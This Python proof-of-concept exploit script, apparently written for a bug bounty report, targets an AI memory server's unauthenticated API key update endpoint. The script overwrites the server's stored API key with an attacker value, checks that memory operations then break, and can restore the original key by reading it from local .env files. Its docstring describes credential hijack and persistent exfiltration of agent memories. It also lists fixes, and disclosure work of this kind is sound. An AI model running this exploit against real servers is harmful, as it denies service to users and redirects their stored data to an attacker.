#!/usr/bin/env python3
"""
CARD 7 — Live API Key Overwrite via /api/ui/api-key
====================================================
Bounty: moorcheh-ai/memanto #1852
Severity: MEDIUM-HIGH
Status: CONFIRMED LIVE (tested 2026-09-25)

Attack summary
--------------
The PUT /api/ui/api-key endpoint accepts a new Moorcheh API key from any
caller with loopback access.  It requires NO session token, NO existing API
key, and NO CSRF protection beyond the existing _require_local check.

  PUT /api/ui/api-key
  {"api_key": "ATTACKER_CONTROLLED_KEY"}
  → 200 OK — server's Moorcheh credential permanently replaced

The replacement takes effect immediately and persists across server restarts
(written to ~/.memanto/config.yaml).  All subsequent memory operations use
the attacker's key.

Impact scenarios
----------------
  1. Credential denial-of-service:
     Replace with an invalid key → all memory operations fail instantly
     (Moorcheh returns 401/403 on every recall/remember)

  2. Credential hijack:
     Replace with attacker's own valid Moorcheh key → all memories are now
     written to the attacker's Moorcheh account instead of the victim's

  3. Data exfiltration (persistent):
     All future remember() calls go to the attacker's namespace, giving the
     attacker a live copy of everything the agent learns going forward

  4. Combined with Card 1:
     Replace the key *after* forging JWTs so the victim cannot simply
     rotate their Moorcheh key to recover — their Memanto server is broken

Prerequisites
-------------
  pip install requests

Usage
-----
  # Demo (replace with test key, then restore — non-destructive)
  python card7_api_key_overwrite.py --host http://127.0.0.1:8765 --demo

  # Replace with a specific key (DESTRUCTIVE — use --restore-key to recover)
  python card7_api_key_overwrite.py --host http://127.0.0.1:8765 \\
      --new-key "ATTACKER_KEY" --restore-key "ORIGINAL_KEY"

Root cause file
---------------
  memanto/app/ui/routes/ui_router.py  update_api_key()
    — only requires _require_local (loopback check), no session, no CSRF token
"""

import argparse
import sys

import requests


def step(n, msg): print(f"\n[Step {n}] {msg}")
def ok(msg):      print(f"  ✅  {msg}")
def fail(msg):    print(f"  ❌  {msg}"); sys.exit(1)
def info(msg):    print(f"  ℹ️   {msg}")
def warn(msg):    print(f"  ⚠️   {msg}")


def get_current_key_preview(ui: str) -> str | None:
    r = requests.get(f"{ui}/config", timeout=5)
    if r.status_code == 200:
        return r.json().get("api_key_preview")
    return None


def run(host: str, new_key: str, restore_key: str | None, demo: bool) -> None:
    ui = f"{host}/api/ui"
    api = f"{host}/api/v2"

    print("=" * 65)
    print("CARD 7 — Live API Key Overwrite")
    print("=" * 65)

    # ── Step 1: Read current key preview ─────────────────────────────────────
    step(1, "Read current API key preview via /api/ui/config (no auth)")
    preview_before = get_current_key_preview(ui)
    if preview_before:
        ok(f"Current key (masked): {preview_before}")
    else:
        info("Could not read current key preview")

    # ── Step 2: Verify a memory op works before the attack ────────────────────
    step(2, "Verify memory operations work before attack")
    r = requests.get(f"{api}/agents", timeout=5)
    if r.status_code == 200:
        agents = [a["agent_id"] for a in r.json().get("agents", [])]
        ok(f"GET /agents: 200 OK — {len(agents)} agents: {agents[:3]}")
    else:
        warn(f"GET /agents: {r.status_code} (server may already be misconfigured)")

    # ── Step 3: Overwrite the API key ─────────────────────────────────────────
    attack_key = "ATTACKER_CONTROLLED_KEY_POC_CARD7" if demo else new_key

    step(3, f"Overwriting API key (no session, no CSRF token)")
    info(f"PUT /api/ui/api-key  {{\"api_key\": \"{attack_key[:20]}...\"}}")

    r = requests.put(f"{ui}/api-key",
                     json={"api_key": attack_key},
                     timeout=5)

    if r.status_code == 200:
        preview_after = r.json().get("api_key_preview", "?")
        ok(f"KEY OVERWRITTEN — HTTP 200")
        ok(f"New key (masked): {preview_after}")
    else:
        fail(f"Overwrite failed: HTTP {r.status_code}: {r.text[:200]}")

    # ── Step 4: Confirm the new key is active ─────────────────────────────────
    step(4, "Confirm new key is active via /api/ui/config")
    preview_active = get_current_key_preview(ui)
    if preview_active and preview_active != preview_before:
        ok(f"Config confirms new key active: {preview_active}")
    elif preview_active:
        info(f"Config shows key: {preview_active}")

    # ── Step 5: Show memory operations now fail (wrong key) ──────────────────
    step(5, "Demonstrate impact — memory operations fail with wrong key")
    # Activate an agent (from loopback, no key needed)
    if agents:
        r_act = requests.post(f"{api}/agents/{agents[0]}/activate",
                              timeout=20)
        if r_act.status_code == 200:
            tok = r_act.json()["session_token"]
            r_recall = requests.post(f"{api}/agents/{agents[0]}/recall",
                                     json={"query": "test", "limit": 3},
                                     headers={"X-Session-Token": tok},
                                     timeout=10)
            if r_recall.status_code == 500:
                ok(f"Recall returns 500 — Moorcheh rejects attacker's key")
                info("All memory operations are now broken for the victim")
            elif r_recall.status_code == 200:
                info(f"Recall still works — attacker key is coincidentally valid")
            else:
                info(f"Recall: HTTP {r_recall.status_code}: {r_recall.text[:100]}")

    # ── Step 6: Restore if requested ─────────────────────────────────────────
    real_key = restore_key or (
        # In demo mode, attempt to restore from local .env
        _read_env_key() if demo else None
    )

    if real_key:
        step(6, "Restoring original API key")
        r = requests.put(f"{ui}/api-key", json={"api_key": real_key}, timeout=5)
        if r.status_code == 200:
            ok(f"Original key restored: {r.json().get('api_key_preview')}")
        else:
            warn(f"Restore failed: {r.status_code} — manually run:")
            print(f"    curl -X PUT {ui}/api-key -d '{{\"api_key\":\"YOUR_KEY\"}}'")
    elif demo:
        warn("Could not auto-restore — run manually:")
        print(f"    curl -X PUT {ui}/api-key -H 'Content-Type: application/json'")
        print(f"         -d '{{\"api_key\":\"YOUR_REAL_KEY\"}}'")

    print("\n" + "=" * 65)
    print("CARD 7 — SUMMARY")
    print("=" * 65)
    print(f"""
  Root cause:  update_api_key() in ui_router.py only checks _require_local
               (loopback origin).  No session token, no CSRF token, no
               existing key verification required.

  Attack:      PUT /api/ui/api-key {{"api_key": "ATTACKER_KEY"}}
               From loopback — zero credentials — instant success

  Confirmed:   HTTP 200, key replaced, persisted to ~/.memanto/config.yaml

  Impact scenarios:
    1. Deny service:   replace with invalid key → all ops fail (500)
    2. Credential theft: redirect writes to attacker's Moorcheh account
    3. Combined with Card 1: destroy recovery path after JWT forge
    4. Combined with Card 3: write to ~/.memanto/config.yaml directly

  Fix:
    • Require the current API key (or session token) to authorize a key change
    • Add CSRF token validation on state-changing UI endpoints
    • Rate-limit key update attempts
""")


def _read_env_key() -> str | None:
    """Try to read the real key from the local .env file."""
    import os
    from pathlib import Path

    for candidate in [
        Path.cwd() / ".env",
        Path.home() / "repos" / "memanto" / ".env",
    ]:
        if candidate.exists():
            for line in candidate.read_text().splitlines():
                line = line.strip()
                if line.startswith("MOORCHEH_API_KEY="):
                    return line.split("=", 1)[1].strip()
    return os.environ.get("MOORCHEH_API_KEY")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Card 7 PoC — API key overwrite")
    p.add_argument("--host",        default="http://127.0.0.1:8765")
    p.add_argument("--demo",        action="store_true",
                   help="Safe demo: replace with test key and auto-restore")
    p.add_argument("--new-key",     default="ATTACKER_CONTROLLED_KEY_POC",
                   help="Key to write (use --demo for safe non-destructive test)")
    p.add_argument("--restore-key", default=None,
                   help="Original key to restore after the demo")
    args = p.parse_args()

    if not args.demo and args.restore_key is None:
        print("WARNING: Running without --demo and without --restore-key.")
        print("         This will permanently overwrite the server's API key.")
        confirm = input("Continue? [y/N] ").strip().lower()
        if confirm != "y":
            sys.exit("Aborted.")

    run(args.host, args.new_key, args.restore_key, args.demo)
